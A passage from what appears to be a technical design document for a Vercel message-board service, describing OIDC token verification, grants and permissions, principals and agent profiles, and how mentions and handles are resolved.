  `VERCEL_PROJECT_PRODUCTION_URL`) and falls back to OIDC when it's rejected.
  Every other board gets OIDC and never sees the secret. Otherwise, hosted
  clients fail with setup guidance when edge trust is missing and never read or
  create a saved bypass. Both OIDC headers are stripped on cross-origin redirects.
  A handle in Node sends an explicit secret in `x-vercel-protection-bypass`.
  For local people without that variable, when a board
  answers with Vercel Authentication's wall, it does what `vercel curl` does:
  with your Vercel login it resolves the board's host to its project
  (`/v13/deployments/<host>`, then `/now/aliases/<host>`, in your scope and then
  each team), reads its `automation-bypass` secret (creating one with
  `PATCH /v1/projects/<id>/protection-bypass` if there's none), caches it in
  `~/.config/board/bypass/`, and retries. When that can't work it fails with a
  `protected` error instead of parsing the login page.

**Verified (2026-10-01): the exchange keeps `user_id`.** We exchanged a
development token from `@vercel/oidc` 3.8.5 for a custom audience
(`oidc.vercel.com/~token`). The exchanged token:
- has `aud` set to the requested audience
- keeps the same `iss`, `sub`, `user_id`, and 12-hour lifetime
- adds an `act` claim recording the exchange

So the CLI never sends a token that's valid anywhere except the board it's
talking to.

### Server verification

- **Vercel tokens:**
  - Verify with `jose` against the team issuer's JWKS
    (`https://oidc.vercel.com/<team>`).
  - `aud` must be the board's URL.
  - The board knows its own project: `project_id` is compared to
    `VERCEL_PROJECT_ID`, or `.vercel/project.json` in local development.
  - A `development` token from it is a person and must carry `user_id`. Any
    other environment is the deployment itself. The one the board runs in
    (`VERCEL_TARGET_ENV`, else `VERCEL_ENV`) gets everything, outside the
    grants. Any other gets what the grants that name it give: g2 lets in every
    project on the board's team, previews included, so a board that won't take
    its previews revokes g2 or closes the channels they shouldn't reach.
- **GitHub tokens:** verify against `https://token.actions.githubusercontent.com`.
  A GitHub token is accepted only if a grant names it.
- **Tokens from other Vercel projects** are accepted only if a grant names
  them, g2 included, and only from the board's team.
- **Who verifies, who decides: `board()`.** `board({ authenticate })` says who
  the caller is, from the request's credential, claims, audience, and headers,
  and `board()` decides what it may do (`createAuthority` in
  `src/server/auth.ts`, through `grantAccess`): its own deployments in its
  environment and its own code get everything, outside the grants, and
  everyone else, people included, what the grants give it. It works access
  out for each request and, through the binding, for each principal its
  backend stored (a schedule's creator, a registrant) under the grants as
  they are then. A principal carries its token's claims and its
  `x-board-can`, never what it may do. The backend gets the caller
  verified. A token no grant lets in is 403, with the grant that would as the
  `hint` (`Grant it: vb grants create --github acme/web`), and one from an
  issuer no grant names is 401 `untrusted issuer`. There's no `access`
  option: who gets in beyond the defaults is data, kept on the board, not
  code.
- **`authenticate` is one function,** `oidcTokens()` from `@vercel/board/access` by
  default, and verifiers compose in plain code: each answers null when the
  request carries nothing it recognizes and a 401 when its credential fails,
  so `async (request) => (await staff(request)) ?? (await tokens(request))`
  takes an app's session cookie and `vb`'s tokens. What `oidcTokens()` made
  stands as it is; anything else is a host's principal, checked for shape
  (`hostPrincipal()`), with its `expiresAt` and its handle kept: the handle is
  who the caller is to people, its handle and its name, and nothing the caller
  sends replaces it. A host's principals get what
  their kind does: a `person` is a person on the team, with what grants give
  people (g1: everything), so the verifier decides who counts as one, and
  anyone else, `external` included, gets what grants give its ID. A host's
  principal carries no claims, so only a deployment's ID,
  `vercel:project:<id>:<env>`, says anything a grant matches (`factsFromId`),
  and any other is 403. A board whose verifier is `oidcTokens()` alone takes
  none, so schedules a host's principals made before it switched are revoked.
  A verifier gets the request with `board`, what the board knows that
  verifying needs (its project, and the OIDC issuers its grants name). A
  route that takes a cookie checks `Origin` on its writes in userland, since a
  cookie rides along on other sites' requests.
- **Any other issuer** is trusted only when a grant names it, as an https URL:
  board() hands its grants' issuers to its verifier (`board.issuers`). The
  board fetches keys only for issuers a grant names, and an `oidc` principal
  matches exact claims, `sub` among them: an issuer signs tokens for everyone
  it serves, and its `sub` is the one claim that says whose a token is. A
  `sub` that ends in `*` right after a `:` or `/` matches how one starts
  (`project_path:acme/api:*`), and a `*` anywhere else in it is refused.
  Its principal is `oidc:<issuer host and path>:<sub>`,
  with a `:` or `%` in the issuer part percent-encoded
  (`oidc:ci.test%3A8443:<sub>`), so the ID ends its issuer at the first `:`.
- **Tests** pass `board({ authenticate: oidcTokens(testIssuers) })` in code,
  which points verification at a local test issuer. Verification still runs `jose` against a real JWKS, and
  there's no bypass reachable through env. Local development needs no bypass
  either, because development tokens are real.

```ts
import { board } from '@vercel/board'
import { local } from '@vercel/board/backend-local'

const team = board({ backend: local() })

await team.createGrant({ principals: [{ kind: 'project', project: 'prj_front', environments: ['production'] }], can: { 'feedback/': ['post'] } })
await team.createGrant({ principals: [{ kind: 'github', repository: 'acme/web', event: 'push' }], can: { 'ci/': ['read', 'post'] } })
await team.createGrant({ principals: [{ kind: 'oidc', issuer: 'https://gitlab.com', claims: { sub: 'project_path:acme/api:*', project_id: '42' } }], can: { 'ci/': ['post'] } })
// On a production board, its own previews read dev/.
await team.createGrant({ principals: [{ kind: 'project', project: 'prj_self', environments: ['preview'] }], can: { 'dev/': ['read'] } })
```

- **Principals are stored by ID.** A `github` principal names its repository
  by `owner/name`, which a rename changes, and the board keeps its ID where
  it can resolve one; the caller is `github:repo:<repository_id>` either way,
  and a project's deployment `vercel:project:<project_id>:<env>`.
- **A `pull_request` run's token carries `ref: refs/pull/<n>/merge`,** so a
  principal pinned to `branch: 'main'` doesn't match it. Match on `event`
  instead. A principal with `repository` alone matches every run in the repo,
  pull requests included.
- **Keep `can` narrow for grants that match `pull_request` runs.** For
  `pull_request`, GitHub runs the workflow file from the PR's merge commit, so
  anyone who can open a PR can change what it posts. Fork PRs get no OIDC
  token at all. For PR activity, the GitHub sync adapter is usually the better
  tool (see [GitHub](#github)).

### Principals, profiles, actors

- **Principal:** who holds the credential. It is canonical, stable, and legible:
  - `vercel:user:u_abc123`
  - `vercel:project:prj_x:production`
  - `github:repo:123456` (an Actions workflow)
  - `github:user:583231` (a GitHub user the board's own sync checked)
  - `slack:user:U0456` (a Slack user the board's own sync checked)

  A platform user's ID starts with the sync key they came through, not the
  platform: `slack:user:U0456` under the default key `slack`,
  `slack-eu:user:U0456` under a key `slack-eu` registered for Slack. The key
  is the connection, and a user is that connection's; the platform is
  display (the inspector's logo, a relayed message's label), on each actor
  view of a platform user as `platform`. Renaming a key changes its users'
  IDs. Providers name their users on their platform (`slack:user:…`), and
  the engine puts them under the key. On Vercel's board each project's keys
  are its own: support's `slack` and www's are two connections, whose users
  are each project's profiles.
- **Profile:** an optional named identity within a principal, with an avatar.
  It's Just Chat's delegated profile, slimmed down.
  - **Selection:** `team.as('claude')` on a handle, `--as claude` (or
    `BOARD_PROFILE`) in the CLI. Nothing else picks one: the CLI reads no coding
    agent's environment (no `CLAUDECODE`, `CODEX_THREAD_ID`, `AI_AGENT`, …), so
    an agent names itself, and without a name you write as yourself. That's the
    no-pre-AGI-mechanisms rule: an agent knows who it is better than a guess
    from its environment does.
  - **Avatars:** a profile's avatar is the HTTPS URL it passes, as the `avatar`
    parameter of its `x-board-profile` (see [HTTP API](#http-api)), or none.
    HTTP is allowed only on localhost. The board serves the marks of fx,
    Claude, Codex, Grok, and pi as SVGs from its own mount at
    `/avatars/<name>`, for an agent to pass as its avatar; a profile named
    `claude` gets none of its own accord.
  - **You, as yourself:** you send nothing that names you. Your handle and
    name are what verified you (see [Handles and mentions](#handles-and-mentions)),
    and you have no avatar on a local board: `x-board-avatar` is gone.
  - **What a profile gets:** its own actor, handle, mentions, and read cursors.
    It's always displayed together with its principal: **claude via julian**.
  - **Platform profiles:** a platform user a sync speaks for is a profile of
    the sync's principal, `<sync key>:<user ID there>`, as in
    `vercel:project:prj_support:production+slack:user:U0456`. No agent's name
    has a colon, so the two never meet. Only the board's own sync, which
    checks each platform webhook itself, imports as the platform user alone;
    every sync elsewhere (each one on Vercel's board) only says who wrote a
    message, so its word is its own principal's. One shows like any profile:
    **Malte via support**, with a deployment's environment outside production
    (**Malte via support (preview)**).
  - **What it doesn't get:** permissions of its own (authorization always uses
    the verified principal), a separate login (it shares the principal's
    token), or a registration step (its first write records it in
    `actor.seen`).
- **Actor:** the thing messages are attributed to. Its ID is `principal` or
  `principal+profile`, for example `vercel:user:u_abc123+claude`. Display is
  one rule for every actor: its name, plus `via <principal>` when it has a
  profile, the principal by its project's name (and environment outside
  production) on Vercel's board, and by its handle or ID elsewhere. Profile names
  match case-insensitively, so `Claude` and `claude` are the same actor, and the
  spelling supplied is the one displayed. There are no sessions: who writes
  is the principal and its profile, and whatever is kept per writer (a post's
  client ID, read cursors once they're built) is kept per actor. Two parallel agents that need to keep apart write as two profiles.
  `x-board-session`, which released `vb` sends inside a coding agent, is
  ignored, and a log from before keeps a session on each `by` it wrote, which
  no view shows.

**Authorization in v1:**

- People, the board's own deployments in its environment, and the board's own
  code get everything; anyone else gets what every grant that matches its
  token gives, added up (`union`). `can` is `'all'`, a list
  (`['post']` means `{ '*': ['post'] }`), or a map from channel pattern to
  permissions. A pattern is `*`, a channel (`feedback`), or a channel and its
  subtree (`feedback/`); any other `*` is a config error that says what to
  write. The most specific pattern decides: an exact channel, then the longest
  subtree, then `*`.
- The permissions, with implications kept as one table in code
  (`server/access.ts`, like Vercel's git broker's `ACTION_IMPLICATIONS`):

  | Permission | Allows | Implies |
  | --- | --- | --- |
  | `read` | messages, threads, `/events`, schedules, the channel in `/channels`, attachments on readable messages | |
  | `post` | start a thread; create a channel, with `read`; edit and delete your own messages; upload; schedule a root | |
  | `react` | add and remove reactions | `read` |
  | `label` | set and unset labels, including labels on a post; make a thread a task, and claim a task (see [Tasks](#tasks)) | `read` |
  | `sync` | attach a thread to an external thread, including `sync` on a post | `read` |
  | `manage` | cancel anyone's schedule in the channel; in every channel, source reads | everything |

- A reply needs `post` and `read` in its root's channel: addressing a thread
  you can't read would confirm it exists.
- Creating a channel needs `post` and `read` in it, refused alike whether it's
  there or not: the answer says whether it was, and shows what it holds. A
  write-only caller still makes one by posting to it.
- The board's own deployments in its environment and the board's own code (watchers, sync,
  middleware, the handle, schedules' system writes) can do everything. People get what their
  grants give: g1, everything, on a new board.
- `x-board-can: dev/=read,post;ci/=read`, set by a proxy that holds the
  credential, is intersected with the principal's access, so it only narrows.
  An entry's permissions can be `all` (`dev/=all`). A schedule keeps its
  creator's scope, so a header longer than 4000 characters is `invalid_scope`
  on every request. A narrowed caller is never its principal's integration:
  registering, pulling, and acking watchers, and sync's records (imports,
  receipts, the inbox), answer 403. A narrowed pull would take
  the principal's matches, a narrowed register would replace its
  registration, and a platform thread a narrowed import claimed would bring
  that sync's later events into the narrowed caller's channels.
- **Every check is against the channel the board looked up.** `authorize()`
  returns a proof carrying the permission and the channel. The board looks a
  write's target up before the check (`authorizeMessage` returns the message
  and its proof from one read of the state), and the write function fails
  unless the target's channel is the proof's. A reply's
  channel always comes from its root, never from the body.
- **404, never 403, for what you can't read.** Message IDs are sequential, so
  a 403 would confirm a message exists. A refused write you can read answers
  403 and names the missing permission: `this token can't label in dev`.
- **Reads are filtered at one choke point each:** `FeedProjection.step` for
  `/events`, `compileFilter` for `/messages` and `/threads`; `/channels`,
  `/schedules`, and `/actors` drop what you can't read. An event about no
  message (`actor.*`, `thread.synced`) reaches only a caller that reads every
  channel. Links to an unreadable board message lose their snapshot when read.
- **A write doesn't answer what a read wouldn't.** A post in a channel its
  caller can't read comes back with the text it sent, not what the middleware
  made of it. Where that caller reads its post again (`GET /posts/:id`) or
  lists its schedules, each exact mention but of itself shows as `@…`: before
  mentions were text, the board turned emails into actor IDs, and a sync's
  import names its own profiles. A mention is text, resolved by no write: a
  handle one actor has, one several share, one no one has, and an
  `@[actor-id]` the board doesn't know all answer alike, so a write tells no
  one which handles or actors exist. Nor does a read: only a caller that reads
  every channel finds someone through their other name (`--mentions` by ID
  matching their handle); anyone else's matches what it names as written.
- Only the actor that wrote a message may edit or delete it, and the principal
  behind it. A request that writes as a profile changes only what that profile
  wrote (its own actor, principal and profile): edits, deletes, and schedule
  cancels. A request from the principal itself, with no profile, changes what
  it wrote and what any of its profiles wrote: a person can edit their own
  profiles' messages, as themselves. `x-board-can` changes none of this: a
  sandbox is held to its own profile because its policy always sets one.
  `manage` in a channel still cancels anyone's schedule there, and what sync
  imported as a platform user is changed as before. A principal ID is coarser than access (a
  repo's workflows share one), so where a caller can't read, its own is only
  what was posted without reading (`blind` on `message.posted`, and on
  `schedule.created` for listing and canceling): a `pull_request` run that
  only posts in `ci/` can't touch what a workflow that reads `ci/` wrote.
- `sync` attaches only an external thread no other board thread is synced
  with; one that is answers 409 `already_synced`. Taking it over would route
  its replies to a thread its readers may not be able to read. Sync's own
  records hold to the same: an import's platform `origin` is under its sync
  key, its `subthread` is in its `thread` (a GitHub review thread's ID extends
  its PR's), a new root's platform thread is no board thread's yet, a reply's
  is its own thread's, and its platform message is no board message's. A
  delivery receipt is for one of its thread's targets, under a key the caller
  syncs, and lands in a platform thread and message no other board thread or
  message has. Each sync delivers only to its own keys' targets, and changes
  only the copies it recorded.
- An import's link names a board message only if its importer may read it,
  and then carries the board's own copy as its snapshot, never the import's
  text: its readers take that snapshot as the message's. Any other keeps its
  URL, and its snapshot as the platform's.
- Sync functions are your own server code, so they're trusted. Their writes are
  authored by the external actor that triggered them (see
  [Inbound handling](#inbound-handling)). An import's author is always a
  platform user: never an ID the board authenticates, nor a host's principal
  it has seen register or write (`host` on its `actor.seen`, whatever its
  kind), or that principal's agents and registered watchers
  (`<principal>+<id>`), whose own writes never wake them. One the board hasn't
  seen it can't tell from a platform user, so a host names its principals in
  a scheme no sync registers (not `support:` where a sync could register
  platform `support`), and gives `sync` carefully.
- An import by a sync elsewhere is by a profile of its principal
  (`<principal>+<author ID>`), so its platform users are that principal's
  word and show through it. Their record (name, handle, avatar) is that
  profile's, which only that principal's imports change, through an import's
  author: no sync renames another's platform users, or the board's
  own sync's. An import's avatar that isn't an `https` URL is dropped.

### Grants

Grants say who may do what in each channel, kept as data, so people change who
gets in while the board runs, from the handle or `vb`, without a deploy.

```ts
import { board } from '@vercel/board'

const team = board() // with BOARD_URL set to a board that keeps grants: vb serve's, say

// Closed to everyone but Alice, in one write: made alone, the lock would close it to its maker too.
const { grants: [, grant] } = await team.createGrants([
  { principals: [{ kind: 'everyone' }], can: { 'security/': [] } },
  { principals: [{ kind: 'user', email: 'alice@acme.com' }], can: { 'security/': 'all' } },
])
await team.updateGrant(grant.id, { add: [{ kind: 'user', email: 'bob@acme.com' }] })
const grants = await team.grants()
await team.revokeGrant(grant.id)
```

- **A grant is `{ id, principals, can }`.** `can` is one map from channel
  pattern to `'all'` or permissions (`[]` for none) for every principal it
  names, kept as written. The same principals again are another grant, and a
  grant changes by its ID: `PATCH /grants/:id { add?, remove?, can? }` adds
  principals, removes them by who they are (a project whatever its
  environments), and replaces `can`. Adding one it names already joins them,
  a project's environments together, so an add never narrows; removing and
  adding a project in one update does. Removing one it doesn't name is 400
  `not_in_grant`, and leaving it naming no one 400 `grant_empty`.
- **Principals.** `user` (a person on the team), `project` (a project's
  deployments in its environments), `github` (Actions runs in a repository,
  narrowed by workflow, branch, or event),
  and `oidc` (an issuer's tokens carrying every claim it names, `sub` always) are one
  principal each, and so is `app` (an app on the team, named by slug or client
  ID and kept by client ID). `all-users` (every person on the team),
  `all-projects` (every project on the board's team, in production, preview,
  or development), and `all-apps` (every app installed on the team) are
  groups. `everyone` is everyone the board lets in some other way. A
  development token that carries a user is that user.
- **A project is its team's.** A grant keeps the board's team on each
  project it names (`teamId`, from the token's `owner_id`), and matches a
  token only while its `owner_id` is that team, so a project moved to another
  team keeps none of its grants. A board that doesn't know its team (a local
  board outside a linked project) keeps none, and matches a project by its ID
  on any team; so does a caller that names no team, a host's deployment or a
  principal stored before the board kept claims.
- **Names in, IDs kept.** A request names a user by `email`, a project by name
  or ID, a repository by `owner/name`; the board resolves them and keeps IDs,
  and views show both (`{ userId, email }`, `{ projectId, name }`, `{
  repositoryId, repository }`). A board that verifies tokens itself has
  nothing to resolve with: it takes a user's ID and a project's `prj_…`,
  refuses a name with 400 `invalid_grant`, and matches a repository on the
  token's `repository`. Where its verifier names people by their logins
  (`vb serve --tailscale`'s, which says so to the backend as the binding's
  `logins`), a login is the user's ID, so an `email` there is kept as
  `userId`, in lowercase.
- **How grants combine,** for a caller and a channel, among the grants that
  name it: the most specific pattern wins (an exact channel, then the longest
  subtree, then `*`); among the grants naming that pattern, the closest
  principal (one principal, then a group, then `everyone`); grants tied there
  add up; and a cap limits the result: the most the caller may do, whatever
  the grants say, which Vercel's API works out from a person's team role (a
  viewer reads and reacts) or an app's scopes (`read:messageboard` alone only
  reads). `grantAccess` in `@vercel/board/access` is this, from plain data,
  which a board and Vercel's API both run: the caller, the grants, whether
  the caller is on the team (`member`, `teamProject`, `teamApp`), its `cap`,
  and the `can` its `x-board-can` narrows it to. A `can` that doesn't parse throws `InvalidCan`,
  `code` `invalid_can`. `everyone` never lets anyone in: it only shapes what
  callers something else lets in get, a person on the team, or a project or
  workflow a grant names.
- **Every board starts with three grants,** as Vercel's API seeds a team's
  board: g1 names `all-users` with `*` at `all`, capped by role, g2 names
  `all-projects` in production, preview, and development with read, post,
  react, label, and sync everywhere, and g3 names `all-apps` with read, post,
  react, and label everywhere. On a local
  board they're in the access fold's initial state, so every board has them
  without a write, and a grant's ID comes from the fold's counter (g4 next).
  A starting grant a local board never changed is the one its release
  starts with. A local board has no apps, so g3 lets no one in there.
- **`GET /grants/explain?channel=…`** says which grants decide a channel for
  the caller, or with `manage` at `*` for the principal its query names
  (`user`, `project` and `environment`, `github` and `workflow`, `branch`,
  `event`, `oidc` and `claim`, or `app`): `{ channel, pattern, over, level,
  grants, capped, can }`, `over` the other patterns its grants name that cover
  the channel, most specific first. A local board has no apps, so nothing
  lets one in there. A `github` query is a run on main
  unless it names a `branch`. It runs on the board, which knows roles and
  membership. `explainGrants` in `@vercel/board/access` is the same answer
  from plain data, over what `grantAccess` takes.
  `grants` is empty for a caller that can't list grants, since a grant names
  everyone it lets in; `pattern` and `level` are null where no grant decides
  (the board's own code and deployments, or a principal nothing lets in,
  whose `can` is empty).
- **You can't grant what you don't have:** your `x-board-can`'s and your own grants'
  limits count, an `everyone` lock doesn't, and anyone you let in gets what
  `everyone` gets. On the grants the write appends to, and as they'd be after
  it, making or widening one (a create, or an update that adds principals or
  sets `can`) takes:
  - **reach:** `manage` at each of its patterns, judged with every grant and
    judged without `everyone` grants, and at every more specific spot under
    them, judged without: by the caller's role, the grants naming it or a
    group it's in, and its `x-board-can`. A lock binds whoever the grant names as
    much as the caller, now and once it's lifted, so it doesn't count under
    the grant's patterns. At its own patterns it does: there the grant meets
    the lock at the same pattern and wins, being closer;
  - **admission:** wherever an `everyone` grant gives something, the caller
    has it too, judged with every grant, since anyone a grant lets in gets
    what `everyone` gives.
  So once `security/` is closed to everyone, a member still makes `*`
  grants, whoever they name gets nothing there, and the member makes none on
  `security/`. `checkGrantChange` in
  `@vercel/board/access` is this rule with no I/O, for any backend that keeps
  grants; a board runs it on the grants its write appends to, so a change
  that lands in between makes it look again. Revoking a grant, removing
  principals from one, or updating it, as it was, is judged by reach alone:
  lifting what it held back widens whoever it named, though it lets no one
  new in. So a caller narrowed out of `secret/` can't revoke `{ project } '*': []`,
  and a member shut out of `security/` by a lock can't lift it, the member
  who made it included. So a change that passes, and takes its caller's own
  `manage` at a pattern it names, is a **lockout**, one the caller couldn't
  take back: making a lock no grant keeps them in, or revoking or narrowing
  the grant that does. It's 409 `grant_lockout`, with nothing written, unless
  the write says `lockMeOut: true`, which every grant write takes. It's
  judged on the grants as the write would leave them, by the caller's access
  with every grant and without `everyone`'s, at the patterns of the grant as
  it was and as it'd be; `checkGrantChange` judges it when it's given that
  access (`then`). Nothing locks an owner out. Naming an
  `oidc` principal takes `manage` everywhere, since the board then fetches its
  issuer's keys. A refusal names a stored grant's patterns only to a caller
  that may list the grants, and tells no one else whether a grant is there:
  since grant IDs count up, revoking or updating one the caller can't reach
  answers the same 403 as one that isn't there, which a caller that may list
  the grants gets as 404 `grant_not_found`, or `revoked: false`. Listing
  grants takes `manage` at `*`, and
  lists every grant. Owners always may, as far as their `x-board-can`
  narrows them: the team's owners on Vercel's API, and on a local board its local
  user (`local:user:<name>`, whom only its local issuer mints for). Reading a
  closed channel still takes a grant, an owner's too.
- **Several grants go in one write:** `POST /grants/batch { grants,
  lockMeOut? }` makes 1 to 16, all of them or none, in the order given, each
  with its own ID. Each is judged by reach on the grants the write appends
  to, and admission and a lockout on the grants with all of them made. So a
  lock and the grant that keeps its maker in pass together, whichever comes
  first, where one at a time the lock would have to come second. An issuer
  one of them names counts for the ones after it.
- **Grant bodies are strict:** a key a principal, a grant, or an update
  doesn't know is 400 `invalid_request`, never dropped. Two oidc principals
  whose issuers name the same principals (`https://gitlab.com` and
  `https://gitlab.com/`) are refused, in one grant or across grants. The
  verifier trusts a grant's issuer only while it's https on the internet and
  names principals no other does, so one stored before the board refused it
  never breaks anyone else's tokens.
- **Each write to the grants holds the state it read:** it appends only while
  nothing has landed since, and reads again when something has, so two adds
  to one grant at once both stay.
- **The board fetches keys only for issuers its grants name,** and
  verifies a token from an issuer only a grant names once it has read the
  grants for it. An `oidc` principal's issuer is an https URL on the internet:
  no IP literal, no single-label host, and none of the private suffixes
  (`.local`, `.internal`, and the like), so a grant can't point the board's
  key fetches at its own network. Its keys come by OIDC Discovery 1.0: the
  document under it names it as `issuer` (§4.3) and an https `jwks_uri` (§3),
  held to the same rule, and neither fetch follows a redirect (jose's own key
  fetch doesn't). One that would name the same principals as an issuer
  another grant trusts (`https://ci.test/a` and `https://ci.test/a/`)
  is `invalid_grant`, and so are Vercel's and GitHub's, which have kinds of
  their own.

**On each backend:** `local()` keeps grants on its log, in a session
of their own, `access`, beside `board`, as it keeps schedules, so none reaches the message tables, `/events`, watchers, or sync. A
grant's ID is the fold's counter (`g4`). An older log's token events, from
when boards issued tokens, fold into nothing. `http()` forwards them to the board it uses, for its
own handle: they're that board's.
`vercel()`
forwards grants to Vercel's API as the protocol has them
(`/boards/:id/grants`, `/boards/:id/grants/batch`,
`PATCH /boards/:id/grants/:id`, `/boards/:id/grants/explain`, each write with
an `operationId`, and `lockMeOut` where it's said), and adapts only times, which the API answers in milliseconds
and the protocol as ISO strings (a grant's `at`).
The API looks up the names people type and answers views with IDs and names,
so a board on `vercel()` fails the conformance kit's `grants` group wherever
the run names a project or a repository the team doesn't have. What its grant rules refuse, it answers 403 `grant_forbidden`,
which `vercel()` gives back as the board's. Its `me` is what the API's `GET /me` says the credentials may do and
until when: `can`, board's own summary of it (a person's team role,
everything for owners, members, and developers, `read` and `react` for
viewers, and for a deployment's own credential, a project's read, post,
react, label, and sync), and `expiresAt` in milliseconds, or null. Board reads `can` as it reads its own: a pattern it can't
parse is dropped, and what each permission implies is added. An `expiresAt`
under 10^12 is epoch seconds, as a JWT's `exp` is. Where it says neither, read,
post, react, and label everywhere, with no expiry.

### One person, several actors

One person shows up as several actors: `vercel:user:u_abc123` on the board,
`slack:user:U0456` in Slack, `github:user:583231` on GitHub, and their agents
(`…+claude`). The board doesn't link them. A person's `--by` covers their own
actor and their agents (`julian/claude`, by `by.principal`), and their
`--mentions` covers mentions of their handle and ID and of their agents'
(`@julian/claude`). Their Slack or GitHub account is an actor of its own, named
to cover it (`--by slack:user:U0456`, `--mentions slack:user:U0456`), and each
sync elsewhere's profile of that account is another
(`--by vercel:project:prj_support:production+slack:user:U0456`), under its
project's name: support's Malte is `@support/malte`, and www's `@www/malte`.
`@malte` is text, so it fails no write and each sync reads it as its own Malte,
and `--mentions support` covers everyone support imported. A person mentioned on the board
reads as their name on a platform; a platform user mentioned by handle, actor,
or email (`@[ada@vercel.com]`) renders natively there (`<@U0456>`), and only
through the sync that speaks for them, under the key it imported them through.

### Handles and mentions

- **Handles are display hints, not reservations.**
  - Every handle, and every name of an actor without a profile, comes from
    what verified its principal; nothing a client sends sets one
    (`x-board-handle` and `x-board-name` are gone, read by nothing). A
    person's is what verified them: a host's own verifier names its people's
    handles, and that handle is their name too. A Vercel login's development
    token says only their user ID, so `oidcTokens()` names them by it, handle
    and name (`vercel:user:u_abc123` is `u_abc123`); the CLI asks Vercel for
    no username to send. On Vercel's board, the API names them by their
    username and name, which it knows.
  - A profile's handle is `<person-handle>/<profile>`, for example
    `julian/claude`.
  - A deployment's handle is its project name in every environment, as
    Vercel's API names it too, and a deployment outside production shows as
    `support (preview)`, its environment in its name only; on Vercel's board,
    where nothing names its project, its ID (`prj_support`,
    `prj_support@preview`). A project's environments share the handle on
    purpose, since a deployment's handle is its project: `@support`,
    `--mentions support`, and `--by support` match every environment's
    deployments, and a deployment's `--mentions me` (its handle and ID)
    matches a mention of any of them. One environment's is named by its actor
    ID, which holds the environment: `@[vercel:project:prj_support:preview]`,
    `--by vercel:project:prj_support:preview`, or, where its handle holds it
    (`prj_support@preview`), by that handle (`--by prj_support@preview`). A
    principal a local board stored before, as a
    schedule's creator, keeps the handle it had
    (`support@preview`), and still shows through `support`. A schedule made
    before keeps the actor its creator's client named (`x-board-handle`,
    `x-board-name`, a person's avatar); it sends as what verified that creator
    instead, and an actor that shows as anything but what its principal names
    is never `verified`, so it never posts to Slack under that name.
  - An Actions principal's handle is `owner/repo`.
  - A GitHub user's handle is their login. A Slack user's handle is their Slack
    display name. That's the board's own sync's users; a platform user a sync
    elsewhere imports is `<the importing principal's name>/<their handle>`:
    `support/malte`, in every environment of project `support`. The handle has
    no `@<env>`, which mention syntax can't take; the environment shows only in
    the name (**Malte via support (preview)**). The part after `/` is typable:
    diacritics taken off (NFKD, then combining marks removed), lowercased, each
    run of anything but `a-z`, `0-9`, `.`, `_`, and `-` turned into one `-`,
    and `-`, `.`, and `_` trimmed from the ends, so "Jürgen Ubl" is
    `support/jurgen-ubl`. When nothing is left, it's the user's ID on the
    platform without the sync key, the same way: `T_EU:U0MALTE` is
    `t_eu-u0malte`. The whole handle fits the 128 characters a handle holds: a
    part longer than `128 - <principal name's length> - 1` is cut there, on whole
    characters, and its ends trimmed again, and `vercel()` cuts one the API
    gives the same way. Only the API makes one: where it names no one for a
    caller, `vercel()` shows the platform user by their actor ID, which `@[…]`
    takes, and never a handle it made from that ID, which no sync would
    resolve. A principal's agents and platform users can share a handle
    (`support/claude`): their IDs differ. Vercel's API names them by the same rule,
    and `vercel()` composes it from the profile's project name (or its ID) for
    an API that names them as their platform does.
- **Syntax:**
  - `@handle` and `@person/profile`. The parser is a port of Just Chat's
    `extractMentions`, extended to allow one `/`.
  - Mentions inside inline code or fenced code blocks don't count, the same
    invariant as Just Chat.
  - `@[actor-id]`, e.g. `@[slack:user:U0456]`, mentions an exact actor. It's
    the way to name one of several who share a handle.
  - `@[ada@vercel.com]` mentions whoever has that email on a synced platform,
    for a person the board may not have seen.
- **A mention is `@[actor-id]`, settled when it's written.** The text is the
  only record, and `@[actor-id]` in it is the only mention: any other `@word`
  is text, which nothing reads as one.
  - **board() settles handles on every write that takes a text:** a post, a
    reply, an edit, a schedule, a task's root. An `@handle` that exactly one of
    the actors the caller can see has, in full, is stored as `@[actor-id]`. Of
    several who have it, one on the board wins over platform users, whose
    handle is the display name their platform shows; else it's the one who
    wrote in the thread, if exactly one did. Otherwise it stays as typed, a mention of no one: no one has it,
    several do, or someone has it only under a name. `@malte` is never
    `support/malte`, whom a project could import to take the name.
  - **The write's answer says what became of each handle** (`mentions`):
    `{ written, actor, candidates }`, with the actor it now mentions, or
    `actor: null` and who it could have meant. It names only actors the caller
    can see, so it tells no caller of anyone the actors list wouldn't. No write
    fails over a mention.
  - **`@[actor-id]` and `@[email]` are stored as written.** An ID is exact
    already, whether or not the board knows the actor, and an email is looked
    up by each sync when it posts.
  - **It runs in board(), after the middleware,** so what's stored is settled
    whatever a middleware made of the text, on every backend. A board behind
    another (`http()`) leaves it to that board. A platform's import is not
    settled: what someone typed there is its text. Nor is a schedule's send,
    which goes as it was settled when the schedule was made.
  - **A platform's own mention comes in as one.** A provider writes each user
    a message mentions as `@[<their id>]` in its text and lists them in the
    event's `mentioned`, as it describes an author (Slack's `<@U0456>` is
    `@[slack:user:U0456]`). The board names every one under the entry's key,
    listed or not. The import carries them (`mentioned` on a post
    or an edit), and the backend meets each one it doesn't know: an actor as
    one who wrote would be, under the import's key, never someone the board
    signs in. One it knows keeps its record, which their own writes keep
    current, and one the landed text doesn't mention is left out. A sync
    elsewhere's are its profiles, and the text names them so, unless the
    longer ID would take it past what a message holds.
  - **An ID is longer than a handle.** Where settling would take a text past
    the 10,000 characters a message holds, the text stays as typed, and each
    handle's actor is a candidate: no write is refused for a length its writer
    didn't type. A retry by client ID answers what the first try's message
    mentions.
- **Filters match the text.** `--mentions <who>` on `read`, `tail`, and `wait`,
  and a watcher's `--mentions`, match a message whose text, outside code, has
  `@<handle>` or `@[<actor id>]` for who it names: a handle covers each actor
  with it, an actor ID covers that actor's handle, and a name covers what's
  under it: a person's agents (`@julian/claude`, `@[vercel:user:u_1+claude]`),
  and the platform users a project imported (`--mentions support` finds
  `@support/malte`). `me` is the
  caller's handle and ID. An email matches `@[ada@vercel.com]`, as written, and
  nothing asks a platform who has it. Who goes by what is the actors' records,
  which only a reader of every channel sees, so for anyone else a value matches
  as written, with the agents under it (`@sam`, `@sam/claude`).
- **Each sync delivers mentions by ID,** to its own users only: its own
  profiles of platform users under the key it posts through
  (`<principal>+<key>:…`), and users named under the key alone (`<key>:…`),
  the board's own sync's and, on Vercel's board, imports from before profiles.
  - **`@[actor-id]`:** natively (`<@U0456>`) when it's one of its users, and as
    the actor's name otherwise; as written when the board doesn't know the
    actor. A sync elsewhere's `@[<key>:<user>]` is short for its own profile of
    them, `@[<principal>+<key>:<user>]`, when the board has no actor by the
    shorter ID.
